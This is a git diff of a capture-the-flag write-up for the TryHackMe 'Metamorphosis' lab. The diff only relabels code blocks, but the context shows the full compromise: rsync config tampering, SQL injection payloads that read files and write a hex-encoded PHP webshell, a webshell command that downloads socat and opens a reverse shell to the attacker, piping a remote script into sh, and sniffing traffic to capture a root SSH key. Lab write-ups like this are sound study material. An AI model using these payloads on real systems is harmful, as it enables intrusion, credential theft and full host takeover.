@@ -66,7 +66,7 @@ Open Ports        | Service
 ### SMB on Port 445
 
 **Listing all shares via CrackMapExec:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# /opt/cme smb $RHOSTS -u '' -p '' --shares
 SMB         10.10.14.138    445    INCOGNITO        [*] Windows 6.1 (name:INCOGNITO) (domain:) (signing:False) (SMBv1:True)
@@ -81,7 +81,7 @@ SMB         10.10.14.138    445    INCOGNITO        IPC$                        
 Nothing weird.
 
 **Enumerating SMB via `enum4linux`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# enum4linux $RHOSTS
 [...]
@@ -96,7 +96,7 @@ S-1-22-1-1000 Unix User\tom (Local User)
 ### Rsync on Port 873
 
 **Manual enumeration:** (From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync))
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# nc -nv $RHOSTS 873
 (UNKNOWN) [10.10.14.138] 873 (rsync) open
@@ -110,7 +110,7 @@ Conf           	All Confs
 - Found module: `Conf`
 
 **Listing share folder `Conf`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# rsync -av --list-only rsync://$RHOSTS/Conf       
 receiving incremental file list
@@ -130,7 +130,7 @@ drwxrwxrwx          4,096 2021/04/10 16:03:08 .
 ```
 
 **Hmm... Let's copy all files to our attacker machine:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# rsync -av rsync://$RHOSTS/Conf ./rsync_shared_Conf 
 receiving incremental file list
@@ -167,7 +167,7 @@ drwxr-xr-x 4 root   root    4.0K Jan 11 00:22 ..
 -rw-rw-r-- 1 nobody nogroup   72 Apr 10  2021 webapp.ini
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# cat rsync_shared_Conf/webapp.ini 
 [Web_App]
@@ -184,7 +184,7 @@ Local = No
 We also found that there is a **MySQL config file**. Maybe the web application is using MySQL as the DBMS (Database Management System)?
 
 **Try to upload a file:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# touch anything
 
@@ -222,7 +222,7 @@ Looks like we can upload any file?
 ### HTTP on Port 80
 
 **Adding a new host to `/etc/hosts`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# echo "$RHOSTS metamorphosis.thm" >> /etc/hosts
 ```
@@ -234,7 +234,7 @@ Looks like we can upload any file?
 A default page of Apache installation.
 
 **Let's use `gobuster` to enumerate hidden files and directories:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# gobuster dir -u http://metamorphosis.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
 [...]
@@ -265,7 +265,7 @@ A default page of Apache installation.
 - Found hidden directory: `/admin`
 
 **`/admin`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# curl -vv http://metamorphosis.thm/admin/                                   
 *   Trying 10.10.14.138:80...
@@ -295,7 +295,7 @@ Hmm.. Fake 403 Forbidden?
 ```
 
 **Enumerating `/admin`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# gobuster dir -u http://metamorphosis.thm/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
 [...]
@@ -333,7 +333,7 @@ Let's try that!
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015057.png)
 
 **And then take a look at the `webapp.ini`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# cat rsync_shared_Conf/webapp.ini 
 [Web_App]
@@ -351,7 +351,7 @@ Local = No
 ```
 
 **Hmm... Can we modify the `env` key's value from `prod` to `dev`?**
-```
+```shell
 [Web_App]
 env = dev
 user = tom
@@ -362,7 +362,7 @@ Local = No
 ```
 
 **Then upload the modified `webapp.ini` via `rsync`:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# rsync -av rsync_shared_Conf/webapp.ini rsync://$RHOSTS/Conf/webapp.ini
 sending incremental file list
@@ -406,7 +406,7 @@ As you can see, when clicked the "Submit Query" button, **it'll send a POST requ
 Then, it'll display the username and password.
 
 **Now, we can try to test SQL injection, as it may be using SQL query to fetch users' info:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u http://metamorphosis.thm/admin/config.php -X POST -d "username=FUZZ" -fs 0
 [...]
@@ -417,7 +417,7 @@ But no luck in fuzzing...
 ## Initial Foothold
 
 **Let's do it manually:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# curl http://metamorphosis.thm/admin/config.php --data-urlencode 'username=" OR 1=1-- -'    
 Username Password<br>tom {Redacted}<br /> 
@@ -430,7 +430,7 @@ Hence, it's vulnerable to SQL injection!
 But which type of SQL injection? Union-based? Blind-based?
 
 **Let's test for Union-based:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# curl http://metamorphosis.thm/admin/config.php --data-urlencode 'username=" UNION ALL SELECT "string1","string2","string3"-- -'
 Username Password<br>string2 string3<br />
@@ -482,7 +482,7 @@ if __name__ == '__main__':
     main()
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,"string3"-- -
@@ -495,7 +495,7 @@ string3
 payload = '''" UNION ALL SELECT NULL,NULL,@@version-- -'''
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,@@version-- -
@@ -506,7 +506,7 @@ payload = '''" UNION ALL SELECT NULL,NULL,@@version-- -'''
 - DBMS information: MySQL version 5.7.34-0ubuntu0.18.04.1
 
 **Let's enumerate the database!**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,database()-- -
@@ -517,7 +517,7 @@ db
 - Current database: `db`
 
 **List all tables:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema != "mysql" AND table_schema != "information_schema"-- -
@@ -528,7 +528,7 @@ users
 ```
 
 **The `users` table looks interesting:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name = "users"-- -
@@ -541,7 +541,7 @@ TOTAL_CONNECTIONS
 ```
 
 **Let's extract all data from that table!**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,CONCAT(uname, ':', password) FROM users-- -
@@ -552,7 +552,7 @@ tom:{Redacted}
 Nothing useful.
 
 **Hmm... Let's try to read a file into to the web server:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py
 [*] Payload: " UNION ALL SELECT NULL,NULL,load_file("/etc/passwd")-- -
@@ -598,7 +598,7 @@ It worked!
 ```
 
 **Convert it to hex:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3
 [...]
@@ -609,7 +609,7 @@ It worked!
 b'3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e'
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# python3 user_query.py                                      
 [*] Payload: " UNION ALL SELECT NULL,NULL,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE "/var/www/html/webshell.php"-- -
@@ -617,7 +617,7 @@ b'3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e'
 ```
 
 **Try to reach our uploaded PHP webshell file:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# curl http://metamorphosis.thm/webshell.php --get --data-urlencode "cmd=id"
 \N	\N	uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -629,7 +629,7 @@ Let's get a reverse shell!
 
 - Setup a listener:
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443    
 2023/01/11 03:39:13 socat[126873] N opening character device "/dev/pts/1" for reading and writing
@@ -638,18 +638,18 @@ Let's get a reverse shell!
 
 - Send the payload: (Generated from [revshells.com](https://www.revshells.com/))
 
-```
+```shell
 ┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
 └─# python3 -m http.server 80       
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# curl http://metamorphosis.thm/webshell.php --get --data-urlencode "cmd=wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443    
 2023/01/11 03:39:13 socat[126873] N opening character device "/dev/pts/1" for reading and writing
@@ -682,7 +682,7 @@ www-data@incognito:/var/www/html$
 I'm user `www-data`!
 
 **user.txt:**
-```
+```shell
 www-data@incognito:/var/www/html$ cat /home/tom/user.txt 
 {Redacted}
 ```
@@ -694,7 +694,7 @@ www-data@incognito:/var/www/html$ cat /home/tom/user.txt
 Let's do some basic enumerations!
 
 **System users:**
-```
+```shell
 www-data@incognito:/var/www/html$ cat /etc/passwd | grep '/bin/bash'
 root:x:0:0:root:/root:/bin/bash
 tom:x:1000:1001::/home/tom:/bin/bash
@@ -709,14 +709,14 @@ drwxr-xr-x  5 tom  tom  4.0K Jun  9  2021 tom
 - Found system user: `tom`
 
 **Kernel version:**
-```
+```shell
 www-data@incognito:/var/www/html$ uname -a;cat /etc/issue
 Linux incognito 4.15.0-144-generic #148-Ubuntu SMP Sat May 8 02:33:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 Ubuntu 18.04.5 LTS \n \l
 ```
 
 **Listening ports:**
-```
+```shell
 www-data@incognito:/var/www/html$ netstat -tunlp
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -747,7 +747,7 @@ udp        0      0 0.0.0.0:138             0.0.0.0:*                           
 - Found localhost port: `1027`, `3306`
 
 **Found MySQL credentials:**
-```
+```shell
 www-data@incognito:/var/www/html$ head -n 5 admin/config.php 
 <?php
 $ini = parse_ini_file('/var/confs/webapp.ini');
@@ -758,7 +758,7 @@ $mysqli = new mysqli("localhost","dev","{Redacted}","db");
 
 Let's dig deeper to port `1027`!
 
-```
+```shell
 www-data@incognito:/var/www/html$ nc -nv 127.0.0.1 1027
 Connection to 127.0.0.1 1027 port [tcp/*] succeeded!
 hello?
@@ -781,7 +781,7 @@ hello?
 By using `nc` to connect to port 1027, we found that it's a HTTP service.
 
 **Let's send a raw GET request to `/`:**
-```
+```shell
 www-data@incognito:/var/www/html$ nc -nv 127.0.0.1 1027
 Connection to 127.0.0.1 1027 port [tcp/*] succeeded!
 GET / HTTP/1.1
@@ -798,13 +798,13 @@ Only Talking to Root User
 Cool. 
 
 **However, before using `chisel` to do port forwarding, let's use LinPEAS:**
-```
+```shell
 ┌──(root🌸siunam)-[/usr/share/peass/linpeas]
 └─# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-```
+```shell
 www-data@incognito:/var/www/html$ curl -s http://10.9.0.253/linpeas.sh | sh
 [...]
 ╔══════════╣ Can I sniff with tcpdump?
@@ -822,13 +822,13 @@ Files with capabilities (limited to 50):
 **I can sniff traffic with `tcpdump`?**
 
 **I also run `pspy` on the target machine:**
-```
+```shell
 ┌──(root🌸siunam)-[/opt/pspy]
 └─# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-```
+```shell
 www-data@incognito:/var/www/html$ wget http://10.9.0.253/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
 [...]
 2023/01/11 09:02:01 CMD: UID=0    PID=19229  | /usr/sbin/CRON -f 
@@ -846,14 +846,14 @@ www-data@incognito:/var/www/html$ wget http://10.9.0.253/pspy64 -O /tmp/pspy;chm
 **Looks like every 2 minutes, `/root/req.sh` sh script will executed by root.** 
 
 **Hmm... Let's try to sniff traffic in port 1027:**
-```
+```shell
 www-data@incognito:/var/www/html$ tcpdump -i any -s 0 'tcp port 1027' -w /tmp/sniffing.cap
 tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
 
 ```
 
 **Then wait 2 minutes, and exit:**
-```
+```shell
 www-data@incognito:/var/www/html$ tcpdump -i any -s 0 'tcp port 1027' -w /tmp/sniffing.cap
 tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
 ^C11 packets captured
@@ -864,19 +864,19 @@ tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 2621
 We've captured 11 packets!
 
 **Let's transfer the captured packets!**
-```
+```shell
 www-data@incognito:/var/www/html$ cd /tmp
 www-data@incognito:/tmp$ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# wget http://$RHOSTS:8000/sniffing.cap
 ```
 
 **After that, we can use WireShark to inspect those packets:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# wireshark sniffing.cap
 ```
@@ -892,7 +892,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 **Found a private SSH key!**
 
 **Let's copy and paste that to our attacker machine:**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# nano key     
                                                                                                        
@@ -901,7 +901,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 **Then we should be able to SSH into `root`!**
-```
+```shell
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
 └─# ssh -i key root@$RHOSTS        
 [...]
@@ -928,7 +928,7 @@ I'm root! :D
 ## Rooted
 
 **root.txt:**
-```
+```shell
 root@incognito:~# cat /root/root.txt
 {Redacted}
 ```
